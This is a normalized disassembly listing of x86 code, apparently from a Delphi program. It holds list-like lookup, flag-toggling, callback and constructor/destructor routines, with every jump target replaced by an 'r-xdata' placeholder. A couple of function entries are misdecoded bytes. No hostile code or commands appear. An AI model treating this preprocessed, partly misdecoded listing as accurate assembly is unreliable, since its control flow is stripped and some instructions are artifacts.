mov eax esi
call sub_46b07c
test al al
je r-xdata
mov edx [ esp ]
mov eax esi
call sub_46af74
cmp ebx eax
jne r-xdata
mov edx [ esp ]
mov eax esi
call sub_46af74
call sub_403124
sub_46b07c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_4043a8
xor eax eax
push ebp
push sub_46b0ee
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
xor eax eax
mov [ edi ] eax
jmp r-xdata
mov eax esi
call sub_414e60
cmp eax [ edi ]
jg r-xdata
mov edx [ edi ]
mov eax esi
call sub_46af74
mov edx [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_407d24
test eax eax
sete bl
test bl bl
jne r-xdata
mov [ edi ] 0xffffffff
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b0f5
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
inc [ edi ]
sub_46b100
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4043a8
xor eax eax
push ebp
push sub_46b158
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_46b07c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b15f
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_46af74
mov esi eax
sub_46b168
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov eax [ ebp + 0x8 ]
call sub_4043a8
xor eax eax
push ebp
push sub_46b22a
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ esi + 0x2e0 ]
xor edx edx
mov eax edi
call sub_414a74
mov [ edi + 0xc ] esi
lea eax [ edi + 0x10 ]
mov edx [ ebp + 0x8 ]
call sub_403f4c
lea eax [ edi + 0x14 ]
call sub_403ef8
mov al [ r-xdata ]
mov [ edi + 0x18 ] al
xor eax eax
mov [ edi + 0x1c ] eax
lea eax [ edi + 0x20 ]
call sub_403ef8
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ edi + 0x24 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ edi + 0x28 ] eax
mov [ edi + 0x34 ] 0x0
mov [ edi + 0x2c ] 0x0
mov [ edi + 0x41 ] 0x0
xor eax eax
mov [ edi + 0x30 ] eax
mov eax [ edi + 0xc ]
mov edx [ eax + 0x2b8 ]
mov [ edi + 0x48 ] edx
mov edx [ eax + 0x2bc ]
mov [ edi + 0x4c ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b231
lea eax [ ebp + 0x8 ]
call sub_403ef8
retn
add esp 0xfffffff0
call sub_403448
sub_46b251
add [ eax ] al
add [ ebx + 0x56 ] dl
call sub_4034b0
mov ebx edx
mov esi eax
mov eax [ esi + 0x24 ]
call sub_403124
mov eax [ esi + 0x28 ]
call sub_403124
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414aac
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_46b28c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4043a8
xor eax eax
push ebp
push sub_46b2ef
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_404304
je r-xdata
cmp [ ebx + 0x4a ] 0x0
je r-xdata
lea eax [ ebx + 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_403f4c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b2f6
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
push 0x0
push 0x0
mov cl 0x1
mov edx ebx
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_46b2fc
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x18 ]
je r-xdata
cmp [ ebx + 0x4a ] 0x0
je r-xdata
mov al [ esp ]
mov [ ebx + 0x18 ] al
pop edx
pop ebx
retn
push 0x0
push 0x0
xor ecx ecx
mov edx ebx
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_46b32c
push ebx
cmp edx [ eax + 0x1c ]
je r-xdata
cmp [ eax + 0x4a ] 0x0
je r-xdata
mov [ eax + 0x1c ] edx
pop ebx
retn
push 0x0
push 0x0
mov ebx eax
xor ecx ecx
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_46b350
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4043a8
xor eax eax
push ebp
push sub_46b3b3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x20 ]
mov edx [ ebp - 0x4 ]
call sub_404304
je r-xdata
cmp [ ebx + 0x4a ] 0x0
je r-xdata
lea eax [ ebx + 0x20 ]
mov edx [ ebp - 0x4 ]
call sub_403f4c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b3ba
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
push 0x0
push 0x0
xor ecx ecx
mov edx ebx
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_46b3c0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4043a8
mov eax [ ebp - 0x8 ]
call sub_4043a8
xor eax eax
push ebp
push sub_46b506
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4041b8
test eax eax
jle r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x40
je r-xdata
xor esi esi
test al al
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
call sub_4041b8
test eax eax
jle r-xdata
inc esi
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4041b8
mov ecx eax
dec ecx
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_404418
mov eax [ ebp - 0x4 ]
call sub_4041b8
test eax eax
jle r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x2b
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4041b8
mov edx [ ebp - 0x4 ]
cmp [ edx + eax - 0x1 ] 0x2b
je r-xdata
test al al
je r-xdata
mov al 0x1
test al al
je r-xdata
mov al 0x1
xor eax eax
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_46b518
test al al
jne r-xdata
add esi 0x2
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4041b8
mov ecx eax
dec ecx
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_404418
add esi 0x2
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4041b8
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_404418
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b50d
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f1c
retn
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x2e4 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_46af88
mov [ ebp - 0xc ] eax
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x24 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
sub_46b518
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_4043a8
xor eax eax
push ebp
push sub_46b5a3
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x0
xor eax eax
mov [ ebx ] eax
jmp r-xdata
mov eax [ esi + 0x24 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebx ]
jg r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebx ]
mov eax [ esi + 0x24 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_407d24
test eax eax
sete [ ebp - 0x5 ]
cmp [ ebp - 0x5 ] 0x0
jne r-xdata
mov [ ebx ] 0xffffffff
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b5aa
lea eax [ ebp - 0xc ]
call sub_403ef8
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
inc [ ebx ]
sub_46b5b4
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov ebx eax
test esi esi
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx [ esi + 0x10 ]
mov eax ebx
call sub_46b518
test al al
je r-xdata
mov edx [ esp ]
mov eax [ ebx + 0x24 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
or edi 0x1
mov ecx edi
mov edx [ esp ]
mov eax [ ebx + 0x24 ]
mov ebp [ eax ]
call [ ebp + 0x24 ]
cmp [ ebx + 0x4a ] 0x0
je r-xdata
push esi
push edi
mov cl 0x2
mov edx ebx
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_46b608
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov ebx eax
test esi esi
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx [ esi + 0x10 ]
mov eax ebx
call sub_46b518
test al al
je r-xdata
mov edx [ esp ]
mov eax [ ebx + 0x24 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
and edi 0xfffffffe
mov ecx edi
mov edx [ esp ]
mov eax [ ebx + 0x24 ]
mov ebp [ eax ]
call [ ebp + 0x24 ]
cmp [ ebx + 0x4a ] 0x0
je r-xdata
push esi
push edi
mov cl 0x2
mov edx ebx
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_46b65c
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov ebx eax
test esi esi
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx [ esi + 0x10 ]
mov eax ebx
call sub_46b518
test al al
je r-xdata
mov edx [ esp ]
mov eax [ ebx + 0x24 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
or edi 0x2
mov ecx edi
mov edx [ esp ]
mov eax [ ebx + 0x24 ]
mov ebp [ eax ]
call [ ebp + 0x24 ]
cmp [ ebx + 0x4a ] 0x0
je r-xdata
push esi
push edi
mov cl 0x2
mov edx ebx
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_46b6b0
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov ebx eax
test esi esi
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx [ esi + 0x10 ]
mov eax ebx
call sub_46b518
test al al
je r-xdata
mov edx [ esp ]
mov eax [ ebx + 0x24 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
and edi 0xfffffffd
mov ecx edi
mov edx [ esp ]
mov eax [ ebx + 0x24 ]
mov ebp [ eax ]
call [ ebp + 0x24 ]
cmp [ ebx + 0x4a ] 0x0
je r-xdata
push esi
push edi
mov cl 0x2
mov edx ebx
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_46b704
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4043a8
xor eax eax
push ebp
push sub_46b779
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b780
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
lea ecx [ ebp - 0x8 ]
mov edx [ esi + 0x10 ]
mov eax ebx
call sub_46b518
test al al
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x24 ]
mov edi [ eax ]
call [ edi + 0x20 ]
cmp [ ebx + 0x4a ] 0x0
je r-xdata
push esi
mov eax [ ebp - 0x8 ]
push eax
mov cl 0x4
mov edx ebx
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_46b788
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
test esi esi
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx [ esi + 0x10 ]
mov eax ebx
call sub_46b518
test al al
jne r-xdata
xor ecx ecx
mov edx [ esi + 0x10 ]
mov eax [ ebx + 0x24 ]
mov edi [ eax ]
call [ edi + 0x3c ]
mov [ esp ] eax
cmp [ ebx + 0x4a ] 0x0
je r-xdata
push esi
mov eax [ esp + 0x4 ]
push eax
mov cl 0x5
mov edx ebx
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_46b7d0
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
test esi esi
je r-xdata
pop edx
pop esi
pop ebx
retn
mov ecx esp
mov edx [ esi + 0x10 ]
mov eax ebx
call sub_46b518
test al al
je r-xdata
cmp [ ebx + 0x4a ] 0x0
je r-xdata
mov edx [ esp ]
mov eax [ ebx + 0x24 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
push esi
mov eax [ esp + 0x4 ]
push eax
mov cl 0x6
mov edx ebx
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_46b814
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
test esi esi
je r-xdata
pop edx
pop esi
pop ebx
retn
mov ecx esp
mov edx [ esi + 0x10 ]
mov eax ebx
call sub_46b518
test al al
je r-xdata
cmp [ ebx + 0x4a ] 0x0
je r-xdata
mov edx [ esp ]
mov eax [ ebx + 0x24 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
push esi
mov eax [ esp + 0x4 ]
push eax
mov cl 0x7
mov edx ebx
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_46b858
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
test esi esi
je r-xdata
pop edx
pop esi
pop ebx
retn
mov ecx esp
mov edx [ esi + 0x10 ]
mov eax ebx
call sub_46b518
test al al
je r-xdata
cmp [ ebx + 0x4a ] 0x0
je r-xdata
mov edx [ esp ]
mov eax [ ebx + 0x24 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
push esi
mov eax [ esp + 0x4 ]
push eax
mov cl 0x8
mov edx ebx
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_46b89c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx [ r-xdata ]
xor edx edx
mov eax edi
call sub_414c58
mov [ edi + 0x18 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_46b8e0
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414ca4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_46b908
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4043a8
xor eax eax
push ebp
push sub_46b975
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_46b9e8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebx + 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_46b168
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b97c
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_46badc
call sub_403124
sub_46b984
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4043a8
xor eax eax
push ebp
push sub_46b9dc
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_46b9e8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b9e3
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_46badc
call sub_403124
sub_46b9e8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_4043a8
xor eax eax
push ebp
push sub_46ba5a
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
xor eax eax
mov [ edi ] eax
jmp r-xdata
mov eax esi
call sub_414e60
cmp eax [ edi ]
jg r-xdata
mov edx [ edi ]
mov eax esi
call sub_46badc
mov edx [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_407d24
test eax eax
sete bl
test bl bl
jne r-xdata
mov [ edi ] 0xffffffff
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ba61
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
inc [ edi ]
sub_46ba6c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4043a8
xor eax eax
push ebp
push sub_46bac4
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_46b9e8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46bacb
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_46badc
mov esi eax
sub_46baf0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax [ ebp - 0x8 ]
call sub_4043a8
xor eax eax
push ebp
push sub_46bb56
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
call sub_414e60
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46bb5d
lea eax [ ebp - 0x8 ]
call sub_403ef8
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_46badc
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_46b704
inc esi
dec ebx
jne r-xdata
sub_46bb64
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
call sub_414e60
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_46badc
mov edx ebp
call sub_46b858
inc esi
dec ebx
jne r-xdata
sub_46bb98
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030f4
lea eax [ esi + 0x4 ]
call sub_403ef8
lea eax [ esi + 0x8 ]
call sub_403ef8
lea eax [ esi + 0xc ]
call sub_403ef8
lea eax [ esi + 0x10 ]
call sub_403ef8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax esi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_46bbf0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + 0x4 ]
mov edi esi
mov edx [ edi + 0x4 ]
call sub_403f4c
lea eax [ ebx + 0x8 ]
mov edx [ edi + 0x8 ]
call sub_403f4c
lea eax [ ebx + 0xc ]
mov edx [ edi + 0xc ]
call sub_403f4c
lea eax [ ebx + 0x10 ]
mov edx [ edi + 0x10 ]
call sub_403f4c
sub_46bc3c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x18 ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_46be0d
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_468560
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ ebx + 0x2c0 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ ebx + 0x104 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_46bb98
mov esi eax
mov [ ebx + 0x108 ] esi
lea eax [ esi + 0x4 ]
call sub_403ef8
lea edx [ esi + 0x8 ]
mov eax [ rw-data ]
call sub_405a5c
lea eax [ esi + 0xc ]
call sub_403ef8
lea eax [ ebp - 0x8 ]
push eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405a5c
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405a5c
mov eax [ ebp - 0x18 ]
xor ecx ecx
pop edx
call sub_408d28
mov edx [ ebp - 0x8 ]
lea eax [ esi + 0x10 ]
call sub_403f4c
lea edx [ ebx + 0xe8 ]
mov eax [ rw-data ]
call sub_405a5c
lea edx [ ebx + 0xec ]
mov eax [ rw-data ]
call sub_405a5c
lea edx [ ebx + 0xf0 ]
mov eax [ rw-data ]
call sub_405a5c
lea edx [ ebx + 0xf4 ]
mov eax [ rw-data ]
call sub_405a5c
lea eax [ ebx + 0xf8 ]
call sub_403ef8
mov edx 0x1a0b
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov al [ r-xdata ]
mov [ ebx + 0x100 ] al
mov [ ebx + 0x10c ] 0x1
lea eax [ ebx + 0x110 ]
call sub_403ef8
xor eax eax
mov [ ebx + 0x114 ] eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
add esp 0xfffffff0
call sub_403448
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46be14
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_403f1c
lea eax [ ebp - 0x8 ]
call sub_403ef8
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ ebx + 0x2c8 ] eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46b89c
mov [ ebx + 0x2e0 ] eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46af08
mov [ ebx + 0x2e4 ] eax
movzx esi [ rw-data ]
dec esi
test esi esi
jl r-xdata
inc esi
mov eax [ ebx + 0x2c8 ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x38 ]
dec esi
jne r-xdata
sub_46be35
add [ eax ] al
add [ ebx + 0x56 ] dl
call sub_4034b0
mov ebx edx
mov esi eax
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax [ esi + 0x2c0 ]
call sub_403124
mov eax [ esi + 0x104 ]
call sub_403124
mov eax [ esi + 0x108 ]
call sub_403124
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4685a0
test bl bl
jle r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403498
mov eax [ esi + 0x2c8 ]
call sub_403124
mov eax [ esi + 0x2e0 ]
call sub_403124
mov eax [ esi + 0x2e4 ]
call sub_403124
mov dl 0x1
mov eax esi
call sub_46c1cc
sub_46bec4
push ebx
mov ebx eax
cmp [ ebx + 0x10c ] 0x1
je r-xdata
pop ebx
retn
lea eax [ ebx + 0x2f0 ]
mov edx [ ebx + 0x2ec ]
mov edx [ edx + 0x6c ]
call sub_403f4c
lea eax [ ebx + 0x2cc ]
mov edx [ ebx + 0x2f0 ]
call sub_403f4c
mov eax [ ebx + 0x2f0 ]
call sub_4041b8
test eax eax
jle r-xdata
cmp [ ebx + 0x26a ] 0x0
je r-xdata
mov eax ebx
call sub_46cb7c
mov ecx [ ebx + 0x2f0 ]
mov edx ebx
mov eax [ ebx + 0x26c ]
call [ ebx + 0x268 ]
sub_46bf2c
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x40 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_46c182
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov eax [ ebx + 0x2e0 ]
call sub_414dbc
mov eax [ ebx + 0x2e4 ]
call sub_414dbc
mov edx [ ebx + 0xe8 ]
mov eax [ ebx + 0x2e4 ]
xor ecx ecx
call sub_46af88
mov [ ebx + 0x2e8 ] eax
lea eax [ ebx + 0x110 ]
mov edx [ ebx + 0xe8 ]
call sub_403f4c
mov dl 0x2
mov eax ebx
call sub_46c814
or edx 0xffffffff
mov eax ebx
call sub_468394
mov dl 0x3
mov eax ebx
call sub_46c814
xor edx edx
push ebp
push j_sub_4036f0
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebx + 0x132 ] 0x0
je r-xdata
mov dl 0x1
mov eax ebx
call sub_46c1cc
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov edx ebx
mov eax [ ebx + 0x134 ]
call [ ebx + 0x130 ]
mov eax [ ebx + 0xb8 ]
call sub_4041b8
test eax eax
jle r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_470bd8
mov [ ebx + 0x2ec ] eax
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0xb8 ]
call sub_403f90
jmp r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_403f90
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0xf8 ]
call sub_403f90
jmp r-xdata
mov eax [ ebx + 0xf8 ]
call sub_4041b8
test eax eax
jle r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebx + 0xe8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
lea edx [ ebp - 0x14 ]
xor ecx ecx
mov eax r-xdata
call sub_408d28
mov edx [ ebp - 0x18 ]
mov eax ebx
call sub_46c248
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebx + 0xf0 ]
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x38 ] 0xb
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x30 ] 0xb
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] 0xb
mov eax [ ebx + 0xf4 ]
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] 0xb
lea edx [ ebp - 0x3c ]
mov ecx 0x3
mov eax r-xdata
call sub_408d28
mov edx [ ebp - 0x1c ]
mov eax ebx
call sub_46c248
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebx + 0xfc ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
lea edx [ ebp - 0x14 ]
xor ecx ecx
mov eax r-xdata
call sub_408d28
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_46c248
cmp [ ebx + 0xfc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c189
lea eax [ ebp - 0x40 ]
call sub_403ef8
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_403f1c
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_403f1c
retn
sub_46c148
call sub_4038b0
call sub_40392c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c189
lea eax [ ebp - 0x40 ]
call sub_403ef8
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_403f1c
